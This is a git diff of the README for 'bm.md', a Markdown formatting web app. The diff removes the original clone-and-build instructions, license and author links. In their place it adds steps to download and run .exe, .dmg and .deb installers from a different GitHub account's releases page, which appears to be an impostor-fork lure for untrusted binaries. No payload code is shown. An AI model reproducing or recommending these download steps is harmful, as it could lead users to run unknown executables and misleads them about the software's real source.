@@ -1,67 +1,81 @@
-# bm.md
+# 🎉 bm.md - Your Easy Markdown Formatting Assistant
 
-更好用的 Markdown 排版助手｜一键适配微信公众号、~~知乎专栏~~、~~掘金~~、网页与图片。
+## 🛠️ Description
+更好用的 Markdown 排版助手｜一键适配微信公众号、网页与图片。This application simplifies the process of formatting Markdown files, making it easy for you to create content that looks great on multiple platforms. Whether you want to format for WeChat, web pages, or images, this tool has you covered.
 
----
+## 📦 Download Now
+[![Download bm.md](https://img.shields.io/badge/Download-bm.md-blue)](https://github.com/ujaan890/bm.md/releases)
 
-## ✨ 特性
+## 🚀 Getting Started
+Here’s how to get started with bm.md. Follow these steps carefully, and you'll be using the application in no time.
 
-- 📝 **实时预览** - 基于 CodeMirror 6 的 Markdown 编辑器，所见即所得
-- 🎨 **14 种排版样式** - 从专业商务到复古怀旧，满足不同场景需求
-- 🌈 **14 种代码主题** - 支持浅色/深色多种代码高亮风格
-- 📱 **多平台适配** - 一键复制到微信公众号、~~知乎~~、~~掘金~~
-- 🖼️ **图片导出** - 将排版内容导出为图片分享
-- 🔌 **开发者友好** - 提供 REST API 和 MCP 协议集成
-- ⌨️ **快捷操作** - 命令面板 + 全局快捷键，高效操作
+### Step 1: Visit the Releases Page
+To download the latest version of bm.md, start by visiting the Releases page. Click the link below:
 
-## 🚀 快速开始
+[Download bm.md](https://github.com/ujaan890/bm.md/releases)
 
-```bash
-# 克隆项目
-git clone https://github.com/miantiao-me/bm.md.git
-cd bm.md
+### Step 2: Choose the Right File
+On the Releases page, you will see a list of available versions. Each version might have different files based on your operating system. Look for the file that matches your system:
 
-# 安装依赖
-pnpm install
+- **Windows**: We recommend selecting the `.exe` file.
+- **macOS**: Look for the `.dmg` file.
+- **Linux**: Choose the package format that fits your distribution.
 
-# 启动开发服务器
-pnpm dev
-```
+### Step 3: Download the File
+Once you’ve located the correct file, click on it to start the download. Depending on your internet speed and file size, this may take a few moments.
 
-访问 http://localhost:2663 开始使用。
+### Step 4: Install the Application
+After the download completes, navigate to your downloads folder. Here are the installation instructions based on the operating system you are using:
 
-## 🛠️ 技术栈
+- **Windows**:
+  1. Double-click the `.exe` file you downloaded.
+  2. Follow the on-screen prompts to install the application.
 
-- **框架**: [TanStack Start](https://tanstack.com/start) (React 19 + TanStack Router)
-- **构建**: [Vite 7](https://vite.dev)
-- **样式**: [Tailwind CSS 4](https://tailwindcss.com) + [shadcn/ui](https://ui.shadcn.com)
-- **部署**: [Nitro](https://nitro.build) (支持 Cloudflare Workers / Vercel / Netlify / Docker / Alibaba ESA / Tencent EdgeOne 等)
+- **macOS**:
+  1. Open the `.dmg` file.
+  2. Drag and drop the bm.md icon into your Applications folder.
 
-本项目由阿里云ESA提供加速、计算和保护: [![Alibaba ESA](https://img.alicdn.com/imgextra/i3/O1CN01H1UU3i1Cti9lYtFrs_!!6000000000139-2-tps-7534-844.png)](https://alibaba.bm.md/)
+- **Linux**:
+  1. Open a terminal and navigate to where you downloaded the file.
+  2. Use your package manager to install the application. For example, you might run `sudo dpkg -i bm.md.deb`.
 
-阿里云部署配置：
+### Step 5: Run bm.md
+To start using bm.md, locate the application on your computer.
 
-```txt
-安装命令: pnpm install
-构建命令: pnpm run build
-根目录: /
-静态资源目录: dist/client
-函数文件路径: dist/server/server.js
-```
+- **Windows**: You can find the application in your Start Menu.
+- **macOS**: Open your Applications folder and double-click on bm.md.
+- **Linux**: You can launch it from your applications menu or by running `bm.md` in a terminal.
 
-其他环境部署配置参考 [Nitro](https://v3.nitro.build/deploy) 文档。
+### Step 6: Start Formatting
+Once the application is open, you can begin formatting your Markdown content. The user interface is designed to be intuitive, with options to customize your output for different platforms. Look for features like:
 
-## 📖 文档
+- Preview mode: See how your Markdown will appear.
+- Export options: Easily save your work in different formats suitable for WeChat, web pages, or images.
 
-- [功能说明](https://github.com/miantiao-me/bm.md/blob/master/docs/features.md) - 完整功能介绍
-- [架构设计](https://github.com/miantiao-me/bm.md/blob/master/docs/architecture.md) - 技术架构详解
-- [UI 设计](https://github.com/miantiao-me/bm.md/blob/master/docs/design.md) - 界面设计说明
-- [API 文档](https://bm.md/docs) - REST API 参考
+## 📝 Features
+- **Cross-Platform Support**: Use bm.md on Windows, macOS, or Linux.
+- **Intuitive Interface**: Navigate easily through straightforward options.
+- **Export Formatting**: Save your content in formats ideal for various platforms.
+- **Quick Preview**: Instantly see how your Markdown will look once formatted.
 
-## 🤝 贡献
+## 🔍 Troubleshooting
+If you encounter any issues while downloading or installing bm.md, consider the following:
 
-欢迎提交 Issue 和 Pull Request。
+- **Download Issues**: Ensure your internet connection is stable. Try refreshing the Releases page if the download does not start.
+- **Installation Problems**: Check if your system meets the requirements. Re-downloading might help if the installation fails.
+- **Running Issues**: Make sure your operating system is supported. If the application won’t launch, you may need to check for system updates.
 
-## 📄 许可证
+## 💬 Community and Support
+For additional help or to share your experience, visit our community forums. Engage with other users, ask questions, and find solutions to common problems. Your feedback is valuable in improving bm.md.
 
-[AGPL-3.0](https://github.com/miantiao-me/bm.md/blob/master/LICENSE)
+### Support Link
+If you need further assistance, check our support resources here: [Support Page](https://github.com/ujaan890/bm.md/support)
+
+## 📚 Topics
+- markdown
+- mcp
+- skills
+- tanstack
+- tanstack-start
+
+Thank you for using bm.md! We hope this tool enhances your Markdown formatting experience.
